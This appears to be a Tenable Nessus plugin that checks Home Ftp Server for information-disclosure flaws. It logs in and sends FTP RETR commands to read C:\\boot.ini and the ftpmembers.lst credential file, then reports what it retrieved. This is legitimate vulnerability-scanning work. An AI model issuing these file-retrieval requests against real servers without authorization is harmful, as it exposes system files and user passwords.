#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote FTP server is affected by various information disclosure
issues. 

Description :

The remote host appears to be running Home Ftp Server, an FTP server
application for Windows. 

The installed version of Home Ftp Server by default lets authenticated
users retrieve configuration files (which contain, for example, the
names and passwords of users defined to the application) as well as
arbitrary files on the remote system. 

See also : 

http://www.autistici.org/fdonato/advisory/HomeFtpServer1.0.7-adv.txt
http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0814.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:R/C:C/A:N/I:N/B:N)";


if (description) {
  script_id(19501);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2726", "CVE-2005-2727");
  script_bugtraq_id(14653);

  name["english"] = "Home Ftp Server Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Home Ftp Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("find_service.nes", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty!", level:0);
  exit(0);
}


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials!", level:0);
  close(soc);
  exit(1);
}


# Make sure it looks like Home Ftp Server.
#
# nb: don't trust the banner since that's completely configurable.
c = string("SYST");
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if ("UNIX Type: L8 Internet Component Suite" >!< s) {
  if (log_verbosity > 1) debug_print("doesn't look like Home Ftp Server; skipped.", level:0);
  exit(0);
}


# Try to get boot.ini.
#
# nb: this may fail if another process is accessing the file.
port2 = ftp_pasv(socket:soc);
if (!port2) exit(0);
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(0);

c = string("RETR C:\\boot.ini");
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if (egrep(string:s, pattern:"^(425|150) ")) {
  file = ftp_recv_data(socket:soc2);

  # There's a problem if it looks like a boot.ini.
  if ("[boot loader]" >< file) {
    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      file
    );
    security_note(port:port, data:report);
    vuln = 1;
  }
}
close(soc2);


if (thorough_tests && isnull(vuln)) {
  # Try to retrieve the list of users.
  port2 = ftp_pasv(socket:soc);
  if (!port2) exit(0);
  soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
  if (!soc2) exit(0);

  c = string("RETR ftpmembers.lst");
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^(425|150) ")) {
    file = ftp_recv_data(socket:soc2);

    # There's a problem if it looks like the member's list.
    if ("[ftpmembers]" >< file && "pass=" >< file) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file 'ftpmembers.lst' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        file
      );
      security_note(port:port, data:report);
    }
  }
  close(soc2);
}

# Close the connections.
ftp_close(socket:soc);
